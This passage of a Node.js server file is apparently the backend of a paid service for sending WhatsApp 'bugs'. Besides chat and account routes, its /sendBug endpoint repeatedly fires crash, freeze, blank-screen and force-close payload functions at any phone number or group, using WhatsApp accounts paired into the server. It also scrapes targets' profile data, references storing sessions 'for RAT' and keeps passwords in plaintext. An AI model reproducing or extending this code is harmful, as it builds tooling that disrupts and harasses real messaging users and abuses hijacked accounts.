if (!fs.existsSync(GLOBAL_CHAT_DIR)) fs.mkdirSync(GLOBAL_CHAT_DIR, { recursive: true });
app.use('/global_chat_uploads', express.static(GLOBAL_CHAT_DIR, {
  maxAge: '1d',
  setHeaders: (res, filePath) => {
    const ext = path.extname(filePath).toLowerCase();
    if (ext === '.wav') res.setHeader('Content-Type', 'audio/wav');
    else if (ext === '.m4a') res.setHeader('Content-Type', 'audio/mp4');
    else if (ext === '.mp3') res.setHeader('Content-Type', 'audio/mpeg');
    else if (ext === '.mp4') res.setHeader('Content-Type', 'video/mp4');
    res.setHeader('Content-Disposition', 'inline');
  }
}));

const globalStorage = multer.diskStorage({
  destination: (_req, _file, cb) => cb(null, GLOBAL_CHAT_DIR),
  filename: (_req, file, cb) => {
    const ext = path.extname(file.originalname || '').toLowerCase() || '.bin';
    cb(null, `${Date.now()}-${crypto.randomBytes(10).toString('hex')}${ext}`);
  }
});
const globalUpload = multer({
  storage: globalStorage,
  limits: { fileSize: 150 * 1024 * 1024 }
});

app.post('/api/chat/upload', globalUpload.single('media'), (req, res) => {
  try {
    const sessionKey = String(req.body?.session_key || req.body?.key || '').trim();
    const username = String(req.body?.username || '').trim();
    const keyInfo = activeKeys[sessionKey];
    if (!keyInfo) {
      if (req.file) try { fs.unlinkSync(req.file.path); } catch (_) {}
      return res.status(401).json({ valid: false, message: 'Invalid session' });
    }
    if (!username || keyInfo.username !== username) {
      if (req.file) try { fs.unlinkSync(req.file.path); } catch (_) {}
      return res.status(401).json({ valid: false, message: 'Username mismatch' });
    }
    if (!req.file) return res.status(400).json({ valid: false, message: 'Media wajib diupload' });

    const requested = String(req.body?.media_type || '').toLowerCase();
    const mediaType = ['image', 'video', 'audio', 'file'].includes(requested)
      ? requested
      : (req.file.mimetype.startsWith('image/') ? 'image' : req.file.mimetype.startsWith('video/') ? 'video' : req.file.mimetype.startsWith('audio/') ? 'audio' : 'file');
    const db = loadDatabase();
    const user = db.find(u => u && u.username === username);
    const now = new Date().toISOString();
    const media_url = `${req.protocol}://${req.get('host')}/global_chat_uploads/${encodeURIComponent(req.file.filename)}`;
    const chat = {
      id: crypto.randomBytes(12).toString('hex'),
      from: username,
      to: 'public',
      message: req.file.originalname || 'Media',
      role: user?.role || 'member',
      avatar_url: user?.chat_profile?.avatar_url || '',
      display_name: user?.chat_profile?.display_name || username,
      media_type: mediaType,
      file_name: req.file.originalname || req.file.filename,
      file_size: req.file.size,
      mime_type: req.file.mimetype,
      media_url,
      time: now,
      created_at: now,
      status: 'terkirim'
    };
    chatList.push(chat);
    if (chatList.length > 1000) chatList = chatList.slice(-1000);
    saveChat();
    for (const ws of wss.clients) {
      if (ws.readyState === WebSocket.OPEN && ws.globalChat) {
        try { ws.send(JSON.stringify({ type: 'new_message', message: chat })); } catch (_) {}
      }
    }
    return res.json({ valid: true, status: 'sent', message: chat });
  } catch (err) {
    if (req.file) try { fs.unlinkSync(req.file.path); } catch (_) {}
    console.error('[CHAT MEDIA POST]', err);
    return res.status(500).json({ valid: false, message: 'Gagal mengupload media' });
  }
});

// ========== CHAT ENDPOINTS ==========
// Global chat memakai target "public".
// Endpoint lama /chatroom tidak dipakai lagi oleh aplikasi.

function chatCanModify(me, message) {
  if (!message) return false;
  if (message.from === me) return true;
  const u = loadDatabase().find(x => x && x.username === me);
  return ['owner','admin','developer'].includes(String(u?.role || '').toLowerCase());
}
function findChatMessage(id) {
  return chatList.findIndex(m => m && String(m.id || '') === String(id || ''));
}
app.post('/api/chat/reaction', (req,res) => {
  const key = String(req.body?.session_key || req.body?.key || '').trim();
  const info = activeKeys[key];
  const id = String(req.body?.id || '').trim();
  const reaction = String(req.body?.reaction || '').trim();
  if (!info) return res.status(401).json({valid:false,message:'Invalid session'});
  const allowed=['❤️','😂','👍','😮','😢','🔥'];
  if (reaction && !allowed.includes(reaction)) return res.status(400).json({valid:false,message:'Reaction tidak didukung'});
  const m=chatList.find(x=>x&&String(x.id||'')===id&&(x.to==='public'||x.to==='public_chat'));
  if(!m)return res.status(404).json({valid:false,message:'Pesan tidak ditemukan'});
  m.reactions=m.reactions&&typeof m.reactions==='object'?m.reactions:{};
  if(!reaction || m.reactions[info.username]===reaction) delete m.reactions[info.username]; else m.reactions[info.username]=reaction;
  saveChat();
  for(const ws of wss.clients) if(ws.readyState===WebSocket.OPEN && ws.globalChat) { try{ws.send(JSON.stringify({type:'message:reaction',message:m}));}catch(_){} }
  return res.json({valid:true,reactions:m.reactions});
});
app.post('/api/chat/forward', (req,res) => {
  const key=String(req.body?.session_key||req.body?.key||'').trim();
  const info=activeKeys[key]; const id=String(req.body?.id||'').trim();
  if(!info)return res.status(401).json({valid:false,message:'Invalid session'});
  const source=chatList.find(x=>x&&String(x.id||'')===id&&(x.to==='public'||x.to==='public_chat'));
  if(!source)return res.status(404).json({valid:false,message:'Pesan tidak ditemukan'});
  const now=new Date().toISOString();
  const chat={id:crypto.randomBytes(12).toString('hex'),from:info.username,to:'public',message:source.message||source.file_name||'Media',media_type:source.media_type||'text',file_name:source.file_name,file_size:source.file_size,mime_type:source.mime_type,media_url:source.media_url,time:now,created_at:now,reactions:{},forwarded:true,forwarded_from:source.from};
  chatList.push(chat); if(chatList.length>1000)chatList=chatList.slice(-1000); saveChat();
  for(const ws of wss.clients) if(ws.readyState===WebSocket.OPEN && ws.globalChat) { try{ws.send(JSON.stringify({type:'new_message',message:chat}));}catch(_){} }
  return res.json({valid:true,status:'sent',message:chat});
});
app.post('/api/chat/edit', (req,res) => {
  const key = String(req.body?.session_key || req.body?.key || '').trim();
  const info = activeKeys[key];
  if (!info) return res.status(401).json({valid:false,message:'Invalid session key'});
  const idx=findChatMessage(req.body?.id);
  if (idx < 0) return res.status(404).json({valid:false,message:'Pesan tidak ditemukan'});
  const m=chatList[idx];
  if (m.to !== 'public' && m.to !== 'public_chat') return res.status(400).json({valid:false,message:'Bukan pesan global'});
  if (!chatCanModify(info.username,m)) return res.status(403).json({valid:false,message:'Tidak boleh mengedit pesan ini'});
  if ((m.media_type || 'text') !== 'text') return res.status(400).json({valid:false,message:'Media tidak bisa diedit'});
  const message=sanitize(req.body?.message || '');
  if (!message) return res.status(400).json({valid:false,message:'Pesan kosong'});
  m.message=message; m.edited=true; m.edited_at=new Date().toISOString(); saveChat();
  for (const ws of wss.clients) if (ws.readyState===WebSocket.OPEN && ws.globalChat) { try { ws.send(JSON.stringify({type:'message:edited',message:m})); } catch(_){} }
  res.json({valid:true,message:m});
});
app.post('/api/chat/delete', (req,res) => {
  const key = String(req.body?.session_key || req.body?.key || '').trim();
  const info = activeKeys[key];
  if (!info) return res.status(401).json({valid:false,message:'Invalid session key'});
  const idx=findChatMessage(req.body?.id);
  if (idx < 0) return res.status(404).json({valid:false,message:'Pesan tidak ditemukan'});
  const m=chatList[idx];
  if (m.to !== 'public' && m.to !== 'public_chat') return res.status(400).json({valid:false,message:'Bukan pesan global'});
  if (!chatCanModify(info.username,m)) return res.status(403).json({valid:false,message:'Tidak boleh menghapus pesan ini'});
  chatList.splice(idx,1);
  if (m.media_url && m.media_url.includes('/global_chat_uploads/')) { try { const f=path.join(GLOBAL_CHAT_DIR, path.basename(new URL(m.media_url).pathname)); if (fs.existsSync(f)) fs.unlinkSync(f); } catch (_) {} }
  saveChat();
  for (const ws of wss.clients) if (ws.readyState===WebSocket.OPEN && ws.globalChat) { try { ws.send(JSON.stringify({type:'message:deleted',id:m.id})); } catch(_){} }
  res.json({valid:true,id:m.id});
});

app.get("/api/chat/messages", (req, res) => {
  try {
    const sessionKey = String(req.query.session_key || req.query.key || "").trim();
    const keyInfo = activeKeys[sessionKey];

    if (!keyInfo) {
      return res.status(401).json({ valid: false, message: "Invalid session key" });
    }

    const username = keyInfo.username;

    // Global = semua pesan dengan tujuan public.
    // Private message milik user tidak ikut tercampur.
    const db = loadDatabase();
    const userMessages = chatList.filter(m =>
      m && (m.to === "public" || m.to === "public_chat")
    ).map(m => {
      const u = db.find(x => x && x.username === m.from);
      return {
        ...m,
        role: u?.role || m.role || 'member',
        display_name: u?.chat_profile?.display_name || m.display_name || m.from,
        about: u?.chat_profile?.about || '',
        avatar_url: u?.chat_profile?.avatar_url || m.avatar_url || ''
      };
    });

    return res.json(userMessages);
  } catch (err) {
    console.error("[CHAT GET]", err);
    return res.status(500).json({ valid: false, message: "Gagal memuat chat global" });
  }
});

app.post("/api/chat/send", (req, res) => {
  try {
    const { session_key, username, message } = req.body || {};
    const keyInfo = activeKeys[session_key];

    if (!keyInfo) {
      return res.status(401).json({ valid: false, message: "Invalid session" });
    }

    // Username dan role tidak dipercaya dari client.
    // Identitas diambil dari session key.
    if (keyInfo.username !== username) {
      return res.status(401).json({ valid: false, message: "Username mismatch" });
    }

    const cleanMessage = sanitize(message || "");
    if (!cleanMessage) {
      return res.status(400).json({ valid: false, message: "Message cannot be empty" });
    }

    const db = loadDatabase();
    const user = db.find(u => u.username === username);

    const now = new Date().toISOString();
    const replyTo = String(req.body?.reply_to || '').trim();
    let replyPreview = null;
    if (replyTo) {
      const source = chatList.find(m => m && String(m.id || '') === replyTo && (m.to === 'public' || m.to === 'public_chat'));
      if (source) replyPreview = { id: source.id, from: source.from, message: sanitize(source.message || source.file_name || 'Media').slice(0, 180), media_type: source.media_type || 'text' };
    }
    const chat = {
      id: crypto.randomBytes(12).toString('hex'),
      from: username,
      to: "public",
      message: cleanMessage,
      role: user?.role || "member",
      avatar_url: user?.chat_profile?.avatar_url || '',
      display_name: user?.chat_profile?.display_name || username,
      time: now,
      created_at: now,
      reactions: {},
      ...(replyPreview ? {reply_to: replyTo, reply_preview: replyPreview} : {})
    };

    chatList.push(chat);
    // Batasi history agar file chat tidak tumbuh tanpa batas.
    if (chatList.length > 1000) chatList = chatList.slice(-1000);
    saveChat();

    // Broadcast ke koneksi WebSocket global yang terdaftar.
    for (const ws of wss.clients) {
      if (ws.readyState === WebSocket.OPEN && ws.globalChat) {
        try {
          ws.send(JSON.stringify({ type: "new_message", message: chat }));
        } catch (_) {}
      }
    }

    return res.json({ valid: true, status: "sent", message: chat });
  } catch (err) {
    console.error("[CHAT POST]", err);
    return res.status(500).json({ valid: false, message: "Gagal mengirim pesan" });
  }
});

app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    console.warn("[❌ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8'));
  } catch {
    return [];
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2));
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
}

const news = [
  {
    image: "https://files.catbox.moe/6va9r3.jpg",
    title: "VERSION 8.0.0",
    desc: "dizt"
  },
    {
    image: "https://files.catbox.moe/6va9r3.jpg",
    title: "VERSION 8.0.0",
    desc: "staff"
  }
];

app.get("/getMyActivity", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid session key" });

  const username = keyInfo.username;
  const userLogPath = path.join(LOGS_DIR, `${username}.json`);

  try {
    if (!fs.existsSync(userLogPath)) {
      return res.json({ valid: true, activities: [] });
    }

    const logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));

    logs.sort((a, b) => b.timestamp - a.timestamp);

    return res.json({ valid: true, activities: logs });
  } catch (err) {
    console.error("[GET LOGS ERROR]", err.message);
    return res.status(500).json({ valid: false, message: "Gagal mengambil log" });
  }
});

app.post("/validate", (req, res) => {
  const { username, password, version, androidId } = req.body;

  if (!androidId) {
    return res.json({ valid: false, message: "androidId required" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);

  if (!user) return res.json({ valid: false });

  if (isExpired(user)) {
    return res.json({ valid: true, expired: true });
  }

  const keyList = loadKeyList();
  const existingSession = keyList.find(e => e.username === username);

  if (existingSession) {
    const oldAndroid = existingSession.androidId;
    const newAndroid = androidId;

    if (oldAndroid !== newAndroid) {
      console.log(`🚫 LOGIN DITOLAK: ${username} | Device Lama: ${oldAndroid} | Device Baru: ${newAndroid}`);

      return res.json({
        valid: false,
        message: "Akun ini sedang login di perangkat lain. Silakan logout terlebih dahulu di perangkat lama."
      });
    }
  }

  const key = generateKey();
  activeKeys[key] = {
    username,
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };

  // ✅ TAMBAHKAN INI - Generate UID jika belum ada
  if (!user.uid) {
    user.uid = crypto.randomBytes(16).toString('hex');
    saveDatabase(db);
    console.log(`[UID] Generated UID untuk ${username}: ${user.uid}`);
  }

  // ✅ TAMBAHKAN INI - Simpan session untuk RAT
  sessions[key] = { username, uid: user.uid };

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId,
  });

  saveUserLog(
    username,
    "login",
    "Login Berhasil",
    `IP: ${req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip} | Device: ${androidId} | UID: ${user.uid}`
  );

  return res.json({
    valid: true,
    expired: false,
    key,
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    news,
    uid: user.uid  // ✅ TAMBAHKAN INI
  });
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  console.log("[ℹ️ INFO] Fetching info for:", username);

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);
  console.log(userKey)

  if (!userKey) {
    console.log("[❌ KEY] Invalid or missing session key.");
    return res.json({ valid: false, reason: "session" });
  }

  if (userKey.androidId !== androidId) {
    console.log("[⚠️ DEVICE] Device mismatch:", userKey.androidId, "!=", androidId);
    return res.json({ valid: false, reason: "device" });
  }

  if (!user) {
    console.log("[❌ INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[⚠️ INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  // ✅ TAMBAHKAN INI - Generate UID jika belum ada
  if (!user.uid) {
    user.uid = crypto.randomBytes(16).toString('hex');
    saveDatabase(db);
    console.log(`[UID] Generated UID untuk ${username}: ${user.uid}`);
  }

  // ✅ TAMBAHKAN INI - Simpan session untuk RAT
  sessions[key] = { username, uid: user.uid };

  console.log("[✅ INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    news: news,
    uid: user.uid  // ✅ TAMBAHKAN INI
  });
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;
  const senderMode = req.query.senderMode || 'private';

  const groupRegex = /chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
  const isGroupLink = groupRegex.test(target || '');
  const isGroupJid = typeof target === 'string' && target.endsWith('@g.us');

  if (!isGroupLink && !isGroupJid) {
    target = (target || "").replace(/\D/g, "");
  }

  console.log(`[📤] target=${target} | bug=${bug} | mode=${senderMode}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  const roleCooldowns = { member: 250, reseller: 290, admin: 60, vip: 10, owner: 1 };
  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] ?? 60;

  if (!user.lastSend) user.lastSend = 0;
  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);

  if (diffSeconds < cooldownSeconds) {
    return res.json({
      valid: true, sended: false,
      cooldown: true, wait: cooldownSeconds - diffSeconds,
    });
  }

  user.lastSend = now;
  saveDatabase(db);

  res.json({ valid: true, sended: true, cooldown: false, role });

  setImmediate(async () => {
    saveUserLog(user.username, "bug",
      `Kirim Bug: ${bug.toUpperCase()}`,
      `Target: ${target} | Mode: ${senderMode} | Role: ${role}`
    );

    let sock = null;

    if (senderMode === 'global') {
      const entries = Object.entries(activeConnections);
      if (entries.length === 0) {
        console.warn(`[❌] Global: tidak ada koneksi aktif.`);
        return;
      }
      sock = entries[Math.floor(Math.random() * entries.length)][1];
      console.log(`[🌍] Global sender. Total aktif: ${entries.length}`);

    } else if (user.role === 'vip') {
      let pool = [];
      const vipPath = path.join(__dirname, 'vip');
      const userPath = path.join(__dirname, 'permenmd', user.username);
      if (fs.existsSync(vipPath)) pool.push(...getActiveSocketsFromPath(vipPath));
      if (fs.existsSync(userPath)) pool.push(...getActiveSocketsFromPath(userPath));
      if (pool.length === 0) {
        console.warn(`[❌] VIP: tidak ada sock.`); return;
      }
      sock = pool[Math.floor(Math.random() * pool.length)];
      console.log(`[👑] VIP pool. Total: ${pool.length}`);

    } else {
      sock = await checkActiveSessionInFolder(user.username);
      if (!sock) {
        console.warn(`[❌] Private: tidak ada sock untuk ${user.username}.`); return;
      }
      console.log(`[🔒] Private: ${user.username}`);
    }

    const attemptSend = async (sock, retry = false) => {
      let sessionName = null;
      try {
        for (const [k, v] of Object.entries(activeConnections)) {
          if (v === sock) { sessionName = k; break; }
        }

        let targetJid = "";

        if (isGroupLink) {
          const inviteCode = target.match(groupRegex)[1];
          console.log(`[🔗] Invite: ${inviteCode}`);
          let groupInfo;
          try { groupInfo = await sock.groupGetInviteInfo(inviteCode); }
          catch (e) { throw new Error("Invite group invalid / expired"); }
          targetJid = groupInfo.id;
          try {
            await sock.groupAcceptInvite(inviteCode);
            console.log(`[✅] Join group: ${targetJid}`);
          } catch { console.log(`[⚠️] Already joined`); }

        } else if (isGroupJid) {
          targetJid = target;
        } else {
          targetJid = target.replace(/\D/g, "") + "@s.whatsapp.net";
        }

        console.log(`[🎯] JID: ${targetJid}`);

        switch (bug) {
          case "delayinvis":
            for (let i = 0; i < 103; i++) {
              await fuckInvisibleDelay(sock, targetJid);
              await sleep(1000);
            }
            break;
          case "blankxstc":
            for (let i = 0; i < 120; i++) {
              await BlankClick(sock, targetJid);
              await sleep(1000);
            }
            break;
          case "frezeexdelay":
            for (let i = 0; i < 100; i++) {
              await FrezeDelay(sock, targetJid);
              await sleep(1000);
            }
            break;
          case "buldozer":
            for (let i = 0; i < 20; i++) {
              await fuckBuldozx(sock, targetJid);
              await sleep(1000);
            }
           break;
          case "spambkp":
            for (let i = 0; i < 1; i++) {
              await spamVideo(sock, targetJid);
              await sleep(1000);
            }
          break;
          case "forclose":
            for (let i = 0; i < 25; i++) {
              await fcWianz(sock, targetJid);
              await sleep(1000);
            }
            break;
        }

        console.log(`[✅] '${bug}' terkirim ke ${targetJid}`);
        return true;

      } catch (err) {
        console.warn(`[⚠️] ${err.message}`);
        if (sessionName && err.message === 'Connection Closed') {
          delete activeConnections[sessionName];
          console.log(`[🗑️] Session ${sessionName} dihapus`);
        }
        if (!retry) {
          if (user.role === 'vip') {
            let pool = [];
            const vipPath = path.join(__dirname, 'vip');
            const userPath = path.join(__dirname, 'permenmd', user.username);
            if (fs.existsSync(vipPath)) pool.push(...getActiveSocketsFromPath(vipPath));
            if (fs.existsSync(userPath)) pool.push(...getActiveSocketsFromPath(userPath));
            if (pool.length > 0) {
              return await attemptSend(pool[Math.floor(Math.random() * pool.length)], true);
            }
          } else {
            const retrySock = await checkActiveSessionInFolder(user.username);
            if (retrySock) return await attemptSend(retrySock, true);
          }
        }
        console.warn(`[❌] Gagal kirim '${bug}' ke ${target}`);
        return false;
      }
    };

    await attemptSend(sock);
  });
});

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);

  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      activeCreds.push({
        sessionName: sessionName
      });
    }
  }

  return activeCreds;
}

app.get("/getActiveSenders", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, senders: [] });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, senders: [] });

  if (!['owner', 'vip','admin'].includes(user.role)) {
    return res.json({ valid: false, senders: [] });
  }

  const senders = Object.keys(activeConnections);
  res.json({ valid: true, senders });
});

app.get("/getSenderStats", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const username = keyInfo.username;
  const baseDir = 'permenmd';
  let privateCount = 0;
  let globalCount = 0;

  try {
    const userPath = path.join(__dirname, baseDir, username);
    if (fs.existsSync(userPath)) {
      const files = fs.readdirSync(userPath).filter(f => f.endsWith(".json"));
      files.forEach(f => {
        const sessionName = path.basename(f, ".json");
        if (activeConnections[sessionName]) privateCount++;
      });
    }

    if (fs.existsSync(baseDir)) {
      const allUsers = fs.readdirSync(baseDir).filter(p => {
        const pPath = path.join(baseDir, p);
        return fs.lstatSync(pPath).isDirectory();
      });

      allUsers.forEach(u => {
        const uPath = path.join(baseDir, u);
        if (fs.existsSync(uPath)) {
          const files = fs.readdirSync(uPath).filter(f => f.endsWith(".json"));
          files.forEach(f => {
            const sessionName = path.basename(f, ".json");
            if (activeConnections[sessionName]) globalCount++;
          });
        }
      });
    }

    res.json({
      valid: true,
      private: privateCount,
      global: globalCount
    });
  } catch (err) {
    console.error("[STATS ERROR]", err.message);
    res.status(500).json({ valid: false, error: "Server Error" });
  }
});

app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  let conns = [];

  if (user.role === 'vip') {
    console.log(`[${user.username}] Request mySender (VIP Mode: VIP Pool + Personal)`);

    const vipPath = path.join(__dirname, 'vip');
    if (fs.existsSync(vipPath)) {
      const vipFiles = fs.readdirSync(vipPath).filter(f => f.endsWith(".json"));
      vipFiles.forEach(f => {
        const name = path.basename(f, '.json');
        if (activeConnections[name]) {
          conns.push({ sessionName: name, source: 'vip' });
        }
      });
    }

    const userPath = path.join('permenmd', user.username);
    if (fs.existsSync(userPath)) {
      const userFiles = fs.readdirSync(userPath).filter(f => f.endsWith(".json"));
      userFiles.forEach(f => {
        const name = path.basename(f, '.json');
        if (activeConnections[name]) {
          conns.push({ sessionName: name, source: 'personal' });
        }
      });
    }

  } else {
    console.log(`[${user.username}] Request mySender (Member Mode)`);
    conns = getActiveCredsInFolder(user.username);
  }

  return res.json({
    valid: true,
    connections: conns
  });
});

const connectVipSessions = async () => {
  const vipPath = path.join(__dirname, 'vip');
  if (!fs.existsSync(vipPath)) {
    console.log(`[👑] Folder vip/ tidak ditemukan, skip.`);
    return;
  }

  const sessions = fs.readdirSync(vipPath).filter(name =>
    fs.statSync(path.join(vipPath, name)).isDirectory()
  );

  console.log(`[👑] VIP sessions ditemukan: ${sessions.length}`);

  await Promise.all(
    sessions.map(sessionName => {
      if (activeConnections[sessionName]) {
        console.log(`[⏭️] VIP ${sessionName} sudah aktif, skip`);
        return Promise.resolve();
      }
      return connectSession(vipPath, sessionName);
    })
  );

  console.log(`[👑] Semua VIP session selesai diproses.`);
};

app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query
  const keyInfo = activeKeys[key]
  if (!keyInfo) return res.json({ valid: false })

  const db = loadDatabase()
  const user = db.find(u => u.username === keyInfo.username)
  if (!user) return res.status(401).json({ error: "Invalid session key" })
  if (!number) return res.status(400).json({ error: "Number is required" })

  try {
    const baseDir = path.join("permenmd", user.username)
    const sessionDir = path.join(baseDir, number)

    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true })
    }

    if (!fs.existsSync(baseDir)) {
      fs.mkdirSync(baseDir, { recursive: true })
    }

    fs.mkdirSync(sessionDir, { recursive: true })

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
      keepAliveIntervalMs: 50000,
      logger: pino({ level: "silent" }),
      auth: state,
      syncFullHistory: true,
      markOnlineOnConnect: true,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      generateHighQualityLinkPreview: true,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      version
    })

    sock.ev.on("creds.update", saveCreds)

    sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
      if (connection === "close") {
        const isLoggedOut =
          lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut
        if (!isLoggedOut) {
          await waiting(3000)
          await pairingWa(number, user.username)
        } else {
          delete activeConnections[number]
        }
      }
    })

    if (!sock.authState.creds.registered) {
      await waiting(1200)
      const code = await sock.requestPairingCode(number, "XAKADEYY")
      if (code) {
        return res.json({ valid: true, number, pairingCode: code })
      }
      return res.json({ valid: false })
    }

    return res.json({ valid: false })
  } catch (err) {
    return res.status(500).json({ error: err.message })
  }
})

// ─── Account role hierarchy ────────────────────────────────────────────────
const CREATE_ROLE_HIERARCHY = {
  member: [],
  vip: [],
  reseller: [],
  owner: ['member', 'vip', 'reseller'], // preserve existing owner access
  partner: ['member', 'vip', 'reseller', 'owner'],
  tk: ['member', 'vip', 'reseller', 'owner', 'partner'],
  moderator: ['member', 'vip', 'reseller', 'owner', 'partner', 'tk'],
  developer: ['member', 'vip', 'reseller', 'owner', 'partner', 'tk', 'moderator', 'developer'],
  // legacy role kept for compatibility with existing accounts
  admin: ['member', 'vip', 'reseller'],
};

function allowedCreateRoles(role) {
  return [...(CREATE_ROLE_HIERARCHY[String(role || 'member').toLowerCase()] || [])];
}

function canCreateRole(creatorRole, targetRole) {
  return allowedCreateRoles(creatorRole).includes(String(targetRole || 'member').toLowerCase());
}

app.get("/createAccount", async (req, res) => {
  const { key, newUser, pass, day, role = 'member' } = req.query;
  console.log(`[👤 CREATE] Request create user '${newUser}' role '${role}' dengan key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, error: true, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);
  if (!creator) return res.json({ valid: true, authorized: false, message: "Not authorized." });

  const creatorRole = String(creator.role || 'member').toLowerCase();
  const targetRole = String(role || 'member').toLowerCase();
  if (!canCreateRole(creatorRole, targetRole)) {
    return res.json({ valid: true, authorized: false, created: false,
      message: `Role ${creatorRole} cannot create ${targetRole}.` });
  }

  const parsedDay = parseInt(day, 10);
  if (!Number.isInteger(parsedDay) || parsedDay < 1 || parsedDay > 3650) {
    return res.json({ valid: true, created: false, message: "Durasi harus berupa angka 1-3650 hari." });
  }
  if (creatorRole === "reseller" && parsedDay > 30) {
    return res.json({ valid: true, created: false, invalidDay: true,
      message: "Reseller can only create accounts up to 30 days." });
  }
  if (!newUser || !pass) return res.json({ valid: true, created: false, message: "Username dan password wajib diisi." });
  if (db.find(u => u.username === newUser)) {
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const roleLimits = { owner: 50, moderator: 45, partner: 40, tk: 40, developer: 1000, admin: 35, reseller: 30 };
  const currentLimit = roleLimits[creatorRole];
  const currentMonth = new Date().toISOString().slice(0, 7);
  if (currentLimit != null) {
    if (!creator.usageLog || creator.usageLog.month !== currentMonth) creator.usageLog = { count: 0, month: currentMonth };
    if (creator.usageLog.count >= currentLimit) {
      return res.json({ valid: true, created: false, limitReached: true,
        message: `Limit pembuatan akun bulan ini (${currentLimit}) telah tercapai.` });
    }
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parsedDay);
  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: targetRole,
    uid: crypto.randomBytes(16).toString('hex'),
    createdBy: creator.username,
    createdAt: new Date().toISOString()
  };
